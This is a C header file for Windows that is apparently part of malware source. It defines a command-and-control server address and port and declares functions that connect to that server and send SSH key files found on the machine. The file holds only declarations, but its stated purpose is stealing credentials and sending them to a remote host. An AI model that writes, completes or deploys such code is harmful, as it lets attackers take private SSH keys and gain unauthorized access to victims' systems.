#ifndef _C2
#define _C2
#include <windows.h>
#include <winsock2.h>

#include "find_ssh_key.h"

#define C2_IP "192.168.1.15"
#define C2_PORT 1234

BOOL send_ssh_key(sshKey [MAX_KEY_FILES], DWORD32, SOCKET *);
BOOL connect_to_c2(SOCKET *);
#endif